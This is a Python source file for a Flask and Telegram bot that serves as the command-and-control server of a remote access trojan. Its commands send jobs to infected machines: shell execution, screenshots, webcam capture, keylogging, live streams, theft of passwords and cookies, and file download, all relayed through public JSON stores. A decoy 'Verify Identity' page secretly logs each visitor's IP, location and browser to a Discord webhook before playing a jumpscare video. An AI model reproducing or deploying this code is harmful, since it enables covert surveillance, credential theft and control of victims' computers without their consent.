# api/index.py
# FINAL VERSION - Corrected all markdown and video link errors.

import os
import re
import json
import uuid
import httpx
import asyncio
import traceback
import time
import threading
from flask import Flask, request

from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
from telegram.constants import ParseMode
from telegram.helpers import escape_markdown

# --- Configuration ---
TOKEN = os.getenv("TELEGRAM_TOKEN")
SECRET_TOKEN = os.getenv("SECRET_TOKEN")
JOBS_URL = "https://api.npoint.io/1a6a4ac391d214d100ac"
STATE_URL = "https://api.npoint.io/c2be443695998be48b75"
HEARTBEAT_URL = os.getenv("HEARTBEAT_URL")
DISCORD_WEBHOOK_URL = os.getenv("DISCORD_WEBHOOK_URL")

# Initialize Flask and Telegram Bot
app = Flask(__name__)
ptb_app = Application.builder().token(TOKEN).build()

# --- Helper Functions ---
def esc(text):
    """Safely escapes text for Telegram MarkdownV2."""
    escape_chars = r'_*[]()~`>#+-=|{}.!'
    return re.sub(f'([{re.escape(escape_chars)}])', r'\\\1', str(text))

async def get_state():
    async with httpx.AsyncClient() as client:
        try:
            res = await client.get(STATE_URL, timeout=5)
            res.raise_for_status()
            return res.json().get("selected_target", None)
        except Exception: return None

async def set_state(target_id):
    async with httpx.AsyncClient() as client:
        try:
            await client.post(STATE_URL, json={"selected_target": target_id}, timeout=5)
        except Exception as e: print(f"Error setting state: {e}")

async def post_job(target_id, command, args):
    job = {"job_id": str(uuid.uuid4()), "target_id": target_id, "command": command, "args": args}
    async with httpx.AsyncClient() as client:
        try:
            try:
                res = await client.get(JOBS_URL, timeout=5)
                current_jobs = res.json() if res.status_code == 200 and isinstance(res.json(), list) else []
            except Exception:
                current_jobs = []
            
            current_jobs.append(job)
            await client.post(JOBS_URL, json=current_jobs, timeout=5)
            return True
        except Exception as e:
            print(f"Error posting job: {e}")
            return False

# --- Telegram Command Handlers ---
async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = (
        "*AGENT CONTROLLER HELP MENU*\n\n"
        "Use these commands to manage and control your agents\\.\n\n"
        "\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\n"
        "*🎯 CORE COMMANDS*\n"
        "`/list` \\- Show all active agents\n"
        "`/target <id|all|clear>` \\- Set the active agent\n"
        "`/help` \\- Display this help menu\n\n"
        "\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\n"
        "*💻 SYSTEM & INFO*\n"
        "`/info` \\- Get detailed system information\n"
        "`/exec <command>` \\- Execute a shell command\n\n"
        "*👁️ SURVEILLANCE*\n"
        "`/ss` \\- Take a screenshot\n"
        "`/cam` \\- Take a webcam photo\n"
        "`/startkeylogger` \\- Begin capturing keystrokes\n"
        "`/stopkeylogger` \\- Stop and upload keylog\n\n"
        "*🔴 LIVE STREAMING*\n"
        "`/livestream` \\- Start a live screen stream\n"
        "`/stoplivestream` \\- Stop the screen stream\n"
        "`/livecam` \\- Start a live webcam stream\n"
        "`/stoplivecam` \\- Stop the webcam stream\n\n"
        "*🔑 DATA EXFILTRATION*\n"
        "`/grab <type>` \\- Steal data \\(passwords, cookies, etc\\.\\)\n\n"
        "*📁 FILE SYSTEM*\n"
        "`/ls` \\- List files in the current directory\n"
        "`/cd <directory>` \\- Change directory\n"
        "`/pwd` \\- Show current directory\n"
        "`/download <file>` \\- Download a file from the agent\n\n"
        "\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\n"
        "*💣 DESTRUCTIVE COMMANDS*\n"
        "`/destroy <id> CONFIRM` \\- Uninstall and remove the agent\n"
    )
    await update.message.reply_text(help_text, parse_mode='MarkdownV2')

async def cmd_list(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not HEARTBEAT_URL:
        await update.message.reply_text("Heartbeat URL is not configured\\.", parse_mode='MarkdownV2')
        return
    await update.message.reply_text("⏳ Fetching active agents\\.\\.\\.", parse_mode='MarkdownV2')
    message = "*AGENT STATUS*\n\n"
    try:
        async with httpx.AsyncClient() as client:
            res = await client.get(HEARTBEAT_URL, timeout=5)
            agents = res.json() if res.status_code == 200 and isinstance(res.json(), list) else []
        active_agents = [agent for agent in agents if time.time() - agent.get("timestamp", 0) < 60]
        if not active_agents:
            message += "_No active agents found\\._"
        else:
            message += f"Found {len(active_agents)} active agent\\(s\\):\n\n"
            for agent in active_agents:
                is_admin_text = "Admin" if agent.get('is_admin') else "User"
                agent_user = agent.get('user', 'N/A')
                message += f"🟢 *ONLINE*\n`{esc(agent.get('id'))}`\n*User:* {esc(agent_user)} `\\({esc(is_admin_text)}\\)`\n\n"
    except Exception as e:
        message = f"❌ Error fetching agent list: `{esc(str(e))}`"
    await update.message.reply_text(message, parse_mode='MarkdownV2')

async def cmd_target(update: Update, context: ContextTypes.DEFAULT_TYPE):
    target_id = " ".join(context.args).lower() if context.args else None
    if not target_id:
        current_target = await get_state() or "None"
        await update.message.reply_text(f"Current target: `{esc(current_target)}`\nUsage: `/target <id|all|clear>`", parse_mode='MarkdownV2')
        return
    if target_id == 'clear':
        await set_state(None)
        await update.message.reply_text("✅ Target cleared\\.")
    else:
        await set_state(target_id)
        await update.message.reply_text(f"✅ Target set to: `{esc(target_id)}`")

async def cmd_destroy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) < 1:
        await update.message.reply_text("Usage: `/destroy <target_id> CONFIRM`", parse_mode='MarkdownV2')
        return
    target_id = context.args[0]
    confirmation = context.args[1] if len(context.args) > 1 else ""
    if confirmation.upper() != "CONFIRM":
        reply_text = (f"⚠️ *ARE YOU SURE?* ⚠️\n\nThis will permanently remove the agent from `{esc(target_id)}`\\. This action cannot be undone\\.\n\nTo proceed, type:\n`/destroy {esc(target_id)} CONFIRM`")
        await update.message.reply_text(reply_text, parse_mode='MarkdownV2')
        return
    if await post_job(target_id, "destroy", ""):
        await update.message.reply_text(f"✅ Self\\-destruct job dispatched to target `{esc(target_id)}`\\.", parse_mode='MarkdownV2')
    else:
        await update.message.reply_text("❌ Error: Failed to dispatch self\\-destruct job\\.")

async def generic_command_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    selected_target = await get_state()
    if not selected_target:
        await update.message.reply_text("❌ No target selected\\. Use `/target` first\\.", parse_mode='MarkdownV2')
        return
    command = update.message.text.split(' ')[0][1:]
    args = " ".join(context.args)
    if await post_job(selected_target, command, args):
        await update.message.reply_text(f"✅ Job `{esc(command)}` dispatched to target `{esc(selected_target)}`\\.", parse_mode='MarkdownV2')
    else:
        await update.message.reply_text("❌ Error: Failed to dispatch job\\.")

async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
    print(f"An exception was raised while handling an update: {context.error}")
    tb_list = traceback.format_exception(None, context.error, context.error.__traceback__)
    tb_string = "".join(tb_list)
    print(tb_string)

# --- Register handlers ---
ptb_app.add_error_handler(error_handler)
ptb_app.add_handler(CommandHandler("help", cmd_help))
ptb_app.add_handler(CommandHandler("list", cmd_list))
ptb_app.add_handler(CommandHandler("target", cmd_target))
ptb_app.add_handler(CommandHandler("destroy", cmd_destroy))
agent_commands = ["info", "startkeylogger", "stopkeylogger", "grab", "exec", "ss", "cam", "livestream", "stoplivestream", "livecam", "stoplivecam", "ls", "cd", "pwd", "download"]
for cmd in agent_commands:
    ptb_app.add_handler(CommandHandler(cmd, generic_command_handler))

# --- Main Webhook Endpoint ---
async def process_update_async(update_data):
    await ptb_app.initialize()
    update = Update.de_json(update_data, ptb_app.bot)
    await ptb_app.process_update(update)
    await ptb_app.shutdown()

@app.route('/', methods=['POST'])
def process_webhook():
    if request.headers.get('X-Telegram-Bot-Api-Secret-Token') != SECRET_TOKEN:
        return 'Unauthorized', 403
    update_data = request.get_json(force=True)
    asyncio.run(process_update_async(update_data))
    return 'OK', 200

def log_to_discord(ip, user_agent):
    if not DISCORD_WEBHOOK_URL: return
    geo_info = {}
    try:
        import requests
        geo_res = requests.get(f"http://ip-api.com/json/{ip}", timeout=3)
        if geo_res.status_code == 200:
            geo_data = geo_res.json()
            geo_info['Country'] = f":flag_{geo_data.get('countryCode', '').lower()}: {geo_data.get('country', 'N/A')}"
            geo_info['City'] = geo_data.get('city', 'N/A')
            geo_info['ISP'] = geo_data.get('isp', 'N/A')
    except Exception:
        geo_info['Error'] = 'Geolocation lookup failed'

    embed = { "title": "👁️ Vercel Site Visitor", "color": 3447003, "description": f"A new visitor has accessed the landing page.", "fields": [{"name": "🌐 IP Address", "value": f"`{ip}`", "inline": True}, {"name": "🌍 Country", "value": geo_info.get('Country', 'N/A'), "inline": True}, {"name": "🏙️ City", "value": geo_info.get('City', 'N/A'), "inline": True}, {"name": "🏢 ISP", "value": geo_info.get('ISP', 'N/A'), "inline": False}, {"name": "🖥️ User Agent", "value": f"```{user_agent}```"}], "footer": {"text": f"Timestamp: {time.ctime()}"} }
    data = {"embeds": [embed]}
    try:
        requests.post(DISCORD_WEBHOOK_URL, json=data, timeout=5)
    except Exception as e:
        print(f"Failed to log to Discord: {e}")

@app.route('/', methods=['GET'])
def health_check_and_scare():
    ip_address = request.headers.get('X-Vercel-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', 'Unknown')
    threading.Thread(target=log_to_discord, args=(ip_address, user_agent)).start()

    html_content = """
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Loading Content...</title>
        <style>
            body, html { overflow: hidden; background-color: #000; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: monospace; }
            #container { text-align: center; z-index: 10; }
            #enter-btn { background-color: #1a1a1a; color: #fff; border: 1px solid #444; padding: 20px 40px; font-size: 24px; cursor: pointer; transition: background-color 0.3s, color 0.3s; }
            #enter-btn:hover { background-color: #fff; color: #000; }
            #scare { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; display: none; z-index: 100; }
            #scare video { width: 100%; height: 100%; object-fit: cover; }
        </style>
    </head>
    <body>
        <div id="container">
            <h1>Authorization Required</h1>
            <p>Please click below to continue.</p>
            <button id="enter-btn">Verify Identity</button>
        </div>
        <div id="scare">
            <video id="scare-video" src="https://files.catbox.moe/g1v4r7.mp4" playsinline></video>
        </div>
        <script>
            const enterButton = document.getElementById('enter-btn');
            const scareContainer = document.getElementById('scare');
            const scareVideo = document.getElementById('scare-video');
            
            enterButton.addEventListener('click', () => {
                document.getElementById('container').style.display = 'none';
                scareContainer.style.display = 'block';
                
                scareVideo.muted = false;
                scareVideo.play().catch(e => console.error("Autoplay failed:", e));

                scareVideo.onended = function() {
                    // Optional: redirect or hide after video ends
                    window.location.href = "https://www.google.com";
                };

                try {
                    if (scareContainer.requestFullscreen) {
                        scareContainer.requestFullscreen();
                    } else if (scareContainer.webkitRequestFullscreen) {
                        scareContainer.webkitRequestFullscreen();
                    }
                } catch (e) {
                    console.log('Fullscreen API not supported.');
                }
            });
        </script>
    </body>
    </html>
    """
    return html_content
